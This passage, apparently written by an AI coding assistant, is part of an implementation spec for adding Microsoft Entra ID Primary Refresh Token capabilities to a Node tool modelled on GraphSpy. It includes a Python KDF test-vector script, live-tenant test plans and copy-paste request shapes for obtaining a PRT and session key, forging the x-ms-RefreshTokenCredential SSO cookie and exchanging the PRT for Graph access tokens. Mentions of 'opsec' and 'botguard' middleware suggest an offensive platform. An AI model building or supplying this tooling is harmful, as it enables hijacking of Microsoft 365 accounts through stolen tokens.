```python
from graphspy.core.prt import calculate_derived_key
import binascii, os
session_key = binascii.unhexlify('<session_key_hex>')
context = os.urandom(24)
derived = calculate_derived_key(session_key, context)
print(context.hex(), derived.hex())
```
Record `(context.hex(), derived.hex())`. In the Node unit test, assert `calculateDerivedKey(sessionKey, Buffer.from(context,'hex')).toString('hex') === derived`. **This single test pins the entire KDF byte layout (counter/length-field widths, BeforeFixed ordering, bits-vs-bytes). Do not proceed past it until it passes.**

**Test 2 — `decryptSessionKey` round-trip.** ✅ **PASS (offline).** The `selfTest()` case `decryptSessionKey RSA-OAEP (JWE segment 2)` encrypts a random 32-byte key with a real RSA-2048 public key using OAEP(MGF1-SHA1, SHA1) and asserts the Node decoder recovers it, plus the PRT-JWT-claim / hex-passthrough variants. *(Original plan: take a real captured `session_key_jwe` + the matching device private key (from `device_credentials`) and assert the Node `decryptSessionKey` output equals the `session_key` hex stored by GraphSpy for the same PRT — still worth doing once as a live cross-check.)*

**Test 3 — `buildPrtCookieJwt` liveness.** ⏳ *Pending live tenant.* Generate a cookie from a live PRT+session key, set it as `x-ms-RefreshTokenCredential` on `login.microsoftonline.com` (clean incognito), and confirm Entra SSO succeeds into an app within ~5 minutes (the exact acceptance the GraphSpy UI uses).

**Test 4 — `prtToAccessToken`.** ⏳ *Pending live tenant.* For a live PRT+session key, run Slice B and confirm the decrypted `access_token` works against `https://graph.microsoft.com/me` (the reference `resource`). Confirm the GCM-vs-CBC branch is hit correctly (log which branch ran).

**Test 5 — Regression.** ⏳ *Pending.* Confirm the existing `devicemanager.getPrtCookie` (`Set-Cookie`) path and `kerberos.js` TGT derivation still behave identically (they are untouched — the integration is additive; static-HMAC `buildPRTJwt` in `cookieconverter.js` is unchanged, now with a deprecation warning).

**Non-goals / cautions:** use a **single known-good test account/tenant** for all live tests (matches the plan's "test against a single known working account/tenant"). Respect Microsoft throttling (429 + `Retry-After`). Do not batch many live PRT exchanges during validation.

---

## §10 Security considerations

- **Session key is high-value.** The decrypted session key lets an attacker forge PRT cookies and (with Slice B) obtain access tokens. Store it **only** encrypted (`utils/encrypt` → AES-256-GCM via the existing `ENCRYPTION_KEY`), never in logs, and never in API responses. Add a redaction guard so the hex key is not echoed to the frontend or logs (existing `[Tokens]` logging already prefixes/truncates tokens — keep that pattern).
- **Short-lived cookie.** The `x-ms-RefreshTokenCredential` cookie is ~5 minutes. Treat it as ephemeral; regenerate on demand (matches the existing "always generate a fresh PRT cookie, never reuse old ones" rule in `tokens.js`).
- **Do not weaken existing protections.** These slices add capabilities; they must not relax `botguard`, `opsec`, `ratelimit`, CSRF, or the `userAuth`/`adminAuth` guards already applied to `/api/tokens/*`. Any new route reuses the same middleware chain as the existing `tokens.js` routes.
- **Proxy / `verify=False`.** Follow the existing `microsoftclient.js` behavior; do not introduce a divergent TLS-verification stance in `prtkdf.js`.
- **Least privilege on the PRT→AT route.** Scope the Graph token to the requested `resource`/`scope`; default to `https://graph.microsoft.com` and let the caller narrow.
- **Audit.** Log (without secrets) when a PRT cookie is generated or a PRT→AT exchange occurs, consistent with existing `[DeviceManager]`/`[Tokens]`/`[Kerberos]` logging.

---

## Appendix A — exact request/response shapes (copy-paste reference)

**A.1 `srv_challenge` nonce**
```
POST https://login.microsoftonline.com/common/oauth2/token
form: grant_type=srv_challenge
→ 200 {"Nonce": "<nonce>", ...}
```

**A.2 `request_for_device` (PRT + session key)**
```
POST https://login.microsoftonline.com/common/oauth2/token
Headers: User-Agent: <ua>
form:
  windows_api_version = 2.2
  grant_type = urn:ietf:params:oauth:grant-type:jwt-bearer
  request = <RS256 JWT: headers{x5c,kdf_ver:2},
            payload{client_id:29d9ed98-a469-4536-ade2-f981bc1d605e,
                    request_nonce:<nonce>, scope:"openid aza ugs",
                    group_sids:[], win_ver:"10.0.26100",
                    grant_type:"refresh_token", refresh_token:<rt>}>
  tgt = False
→ 200 {"refresh_token":"<PRT>", "session_key_jwe":"<compact JWE>", "expires_on":<epoch>, ...}
```

**A.3 `refresh_to_access_token`**
```
POST https://login.microsoftonline.com/common/oauth2/token
Headers: User-Agent: <ua>
form:
  grant_type = urn:ietf:params:oauth:grant-type:jwt-bearer
  request = <HS256 JWT: headers{ctx:base64(context), kdf_ver:2},
            payload{request_nonce, refresh_token:<PRT>,
                    redirect_uri:"ms-appx-web://Microsoft.AAD.BrokerPlugin/<client_id>",
                    grant_type:"refresh_token", client_id, win_ver:"10.0.26100",
                    scope:"openid aza", iss:"aad:brokerplugin",
                    resource:"https://graph.microsoft.com",
                    aud:"login.microsoftonline.com", iat, exp},
            signed with KDF(session_key, SHA256(context ‖ payloadBytes))>
  client_info = 1
  windows_api_version = 2.2
→ 200 body = compact JWE: <header>.<encKey>.<iv>.<ciphertext>.<authtag>
   decrypt: key = KDF(session_key, base64url(header).ctx)
           iv len 12 → AES-256-GCM(ciphertext‖authtag, AAD=header)
           else     → AES-256-CBC + PKCS7
→ plaintext JSON {"access_token": ..., "refresh_token"?, "refresh_token_expires_in", ...}
```

**A.4 `generate_cookie` (PRT cookie)**
```
cookie = HS256(
   headers  {ctx: base64(context), kdf_ver: 2},
   payload  {refresh_token:<PRT>, is_primary:"true", request_nonce:<nonce>},
   key      = KDF(session_key, SHA256(context ‖ payloadBytes))
)
set as:  name  = x-ms-RefreshTokenCredential
         value = cookie
         domain= login.microsoftonline.com
```

**A.5 `KDF` (both request and cookie use this; response uses raw ctx)**
```
KBKDF-HMAC-SHA256 counter mode, output 32 bytes,
  rlen=4, llen=4, CounterLocation.BeforeFixed,
  label = "AzureAD-SecureConversation",
  context = <context bytes>, fixed = None
⚠️ Validate against the golden vector in §9 (Test 1) before use.
```

---

*End of spec. Next step (pending user decision): pick the first slice — recommended build order is **C → A** (obtain PRT+session key, then generate the cookie), with **B** (PRT→access token) as a fast follow. All slices start behind the §9 Test-1 KBKDF golden vector.*
